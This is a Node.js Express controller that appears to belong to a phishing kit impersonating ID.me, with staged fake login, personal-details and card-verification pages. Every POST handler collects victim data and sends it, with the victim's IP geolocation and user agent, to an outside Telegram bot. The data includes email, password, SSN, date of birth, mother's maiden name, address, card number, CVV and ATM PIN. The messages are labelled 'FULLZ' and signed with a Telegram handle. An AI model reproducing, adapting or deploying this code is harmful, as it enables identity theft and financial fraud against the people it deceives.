const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../settings");
const getIPDetails = require("../middleware/getIPDetails");

// console.log(getIPDetails());

let storedCredentials = {
  email: "",
  password: "",
  fname: "",
  ssn: "",
  address: "",
  city1: "",
  state: "",
  zipcode: "",
};

exports.login = (req, res) => {
  return res.render("login");
};

exports.loginPost = async (req, res) => {
  const { email, password } = req.body;

  storedCredentials = { email };

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `||ID.ME LOGIN\n\n` +
    `||🔰Email : ${email}\n` +
    `||🔑Password : ${password}\n` +
    `++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/login/2");
};

exports.login2 = (req, res) => {
  res.render("login2");
};

exports.loginPost2 = async (req, res) => {
  const { email, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];
  storedCredentials = { ...storedCredentials, password };

  const message =
    `||ID.ME LOGIN 2 \n\n` +
    `||🔰Email : ${email}\n` +
    `||🔑Password : ${password}\n` +
    `++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;
  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/personal");
};

exports.personal = (req, res) => {
  res.render("personal");
};

exports.personalPost = async (req, res) => {
  const { fname, dob, mmn, phone, ssn, address, city1, state, zipcode } =
    req.body;
  const { email, password } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  storedCredentials = {
    ...storedCredentials,
    email,
    password,
    fname,
    dob,
    mmn,
    phone,
    ssn,
    address,
    city1,
    state,
    zipcode,
  };

  const userAgent = req.headers["user-agent"];
  storedCredentials = {
    ...storedCredentials,
    email,
    password,
    fname,
    dob,
    mmn,
    phone,
    ssn,
    address,
    city1,
    state,
    zipcode,
  };

  const message =
    `||ID.ME 2024 FULLZ\n` +
    `||🔰User ID  : ${email}\n\n` +
    `||🔑Password  : ${password}\n\n` +
    `||Full Name  : ${fname}\n\n` +
    `||SSN  : ${ssn}\n\n` +
    `||Address  : ${address}\n\n` +
    `||City  : ${city1}\n\n` +
    `||State  : ${state}\n\n` +
    `||ZIpcode  : ${zipcode}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

exports.card = (req, res) => {
  res.render("card-verification");
};

exports.cardPost = async (req, res) => {
  const { cname, cardNum, exp, cvv, atm } = req.body;
  const {
    email,
    password,
    fname,
    dob,
    mmn,
    phone,
    ssn,
    address,
    city1,
    state,
    zipcode,
  } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  storedCredentials = {
    ...storedCredentials,
    email,
    password,
    fname,
    dob,
    mmn,
    phone,
    ssn,
    address,
    city1,
    state,
    zipcode,
    cname,
    cardNum,
    exp,
    cvv,
  };

  const userAgent = req.headers["user-agent"];

  const message =
    `||ID.ME 2024 CARD DETAILS\n\n` +
    `||🔰User ID  : ${email}\n\n` +
    `||🔑Password  : ${password}\n\n` +
    `||Fullname  : ${fname}\n\n` +
    `||Date of birth  : ${dob}\n\n` +
    `||Mother's Maiden Name  : ${mmn}\n\n` +
    `||PhoneNum  : ${phone}\n\n` +
    `||SSN  : ${ssn}\n\n` +
    `||Address  : ${address}\n\n` +
    `||City  : ${city1}\n\n` +
    `||State  : ${state}\n\n` +
    `||Zipcode  : ${zipcode}\n\n` +
    `||Name on Card  : ${cname}\n\n` +
    `||CardNum  : ${cardNum}\n\n` +
    `||Expiry Date  : ${exp}\n\n` +
    `||CVV  : ${cvv}\n\n` +
    `||ATM PIN  : ${atm}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

exports.success = (req, res) => {
  return res.render("success");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
